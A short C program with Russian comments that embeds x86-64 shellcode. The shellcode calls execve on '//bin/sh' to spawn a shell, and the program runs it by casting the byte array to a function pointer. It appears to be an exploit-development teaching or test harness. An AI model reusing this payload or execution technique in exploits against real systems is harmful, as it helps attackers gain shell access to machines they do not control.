#include <stdio.h>

// Глобальный массив с шелл-кодом
unsigned char code[] = \
"\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode Length: %ld\n", sizeof(code) - 1);
    
    // Прямая передача управления на адрес массива
    // Мы приводим адрес массива к указателю на функцию и вызываем её
    void (*ret)() = (void(*)())code;
    ret();
    
    return 0;
}